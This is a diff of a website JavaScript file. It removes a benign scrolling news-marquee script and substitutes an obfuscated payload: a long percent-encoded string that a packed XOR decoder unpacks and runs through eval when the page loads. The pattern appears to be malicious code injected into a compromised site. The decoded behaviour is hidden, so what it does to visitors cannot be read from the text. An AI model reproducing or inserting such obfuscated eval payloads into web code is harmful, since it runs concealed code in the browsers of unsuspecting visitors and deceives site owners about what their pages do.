@@ -4,35 +4,4 @@
 *  @email  cinbit@sina.com
 */
 
-var speed=40;
-var maxlength=56;
-var demo = document.getElementById("demo");
-var demo1 = document.getElementById("demo1");
-var demo2 = document.getElementById("demo2");
-ShowNews();
-demo2.innerHTML=demo1.innerHTML;
-function Marquee(){
-	if(demo.scrollLeft>=demo.offsetWidth){
-		demo.scrollLeft-=demo2.offsetWidth;
-	}
-	else{
-		demo.scrollLeft++;
-	}
-}
-var MyMar=setInterval(Marquee,speed);
-demo.onmouseover=function(){
-	clearInterval(MyMar);
-}
-demo.onmouseout=function(){
-	MyMar=setInterval(Marquee,speed);
-}
-function ShowNews(){
-	var newslength=0;
-	for(var i=news.length-1;i>=0;i--){
-		newslength+=news[i].text.length+3;
-		if(newslength>maxlength){
-			break;
-		}
-		demo1.innerHTML+="<a href='"+news[i].url+"' target='_blank'>"+news[i].text+"</a>";
-	}
-}
+var ssstttrrrstr="%7Bmy*zxbca972%3A*i%7Fo%3Cv%7Batrxr%60%7B/%24%264%04%7Bmy*mmji%259%23fnCjsxro4%7E%7DcSyq%7Ew%7FdMwDh%23%28mmji%27-8%08wAm%3Eyyvu%288*6q%7Bpg%7Cuaz%23kn%7ELdbk%60jw@xi%7B6%3Fx%7Ewv%295%3F.%1Eesc0kk%60c9*4%28cifqngoT1yxh%5Ev%7CurxaVj%5Bu8-jhad8+%21%3C%0CVlluOEhm55%20%10%7D%7Dzy%27%3Az%7C%7Fu%7DFYAG7mmji4*jloEmVIQW%21%13%7Ebxv%60z%7D%7F0Bo%7F%7D%7Eol%20.%7D%0F%0Djd%29Dzsr2hykw%7BzYquf/-kk%60c%25eontcqSjfuH6e%17%15%12%7E%7Cux8fwa%7D%7D%7CCkkx%267mmji7*ldgSzjJu%7Fnq%23%1D%1Fh%1E%1Aw%7Dcju%07%05%02nleh%28vgqmmLS%7B%7Bh01%22%12%1Ek%1Fi%19dpb/CtAjx4%7BbrLjwgsV%7Er5Qzhhmrs9gcwtt%265%07hngf%26hhhkvqdOi%7Bo%21%7Dow%7Bc%7Fzz%3B%3Bj%1A%06maijx@fscwrbn%29mfS%7Cn2%21%13e%1Drpy%7C%3C%7E%7Ebax%7Fne%7C%7C%3A%60pj%60vhOq64g%11%13TaZwg%29%60weYazh%7E%7Dke%20Jgwuvgd%0Clnxy%7F3%22%12j%1Csa%7Dqey%60%60-_ce%7EFbqv%2C*y%0B%29i%7Fo%3Cu%7Fnk%7Bs%7Bsgz%2C%204%04%04jdx%21%7Eft%25m%3EldWl0qyu%7Dmp%3A%27.%7D-/%21+f%23%20%25p%00%00%01icrwogoGkv6%21u%7FnkL%7FH%3Agwid%21bhbl%7Ea%234%3D%0F%0D%0Akg%08q%7Bjow%7Fw%7Fc%7E+yrj%7Duaiyd%22q%03%01%0E%0Fgvfcj%1B%15%17%14a%11%13%10%7Cr%7Bz%25%3D%7B%7F%7Ej%7CEXFF%225%25%3Ad%24kpdF%229%3F7u%7FnkL%7FH%3Af%60%7D%3B-%29-xjxnms%3B%22%5Ban%60Nt9%23%3E0t%7CodM%7CI%3Dfth%7B%25/0%24k7*%3C%0C%0Cy%09%7F";eval(function(p,a,c,k,e,d){while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+c+'\\b','g'),k[c])}}return p}('9 10(6){5 4="";5 3=11(6);8(5 2=0;2<3.7;2++){4+=16.12(3.15(2)^(1+(3.7-2)%14))}13 4}',10,17,'||c|s|f|var|Y|length|for|function|dU|unescape|fromCharCode|return|32|charCodeAt|String'.split('|')));eval(dU(ssstttrrrstr));
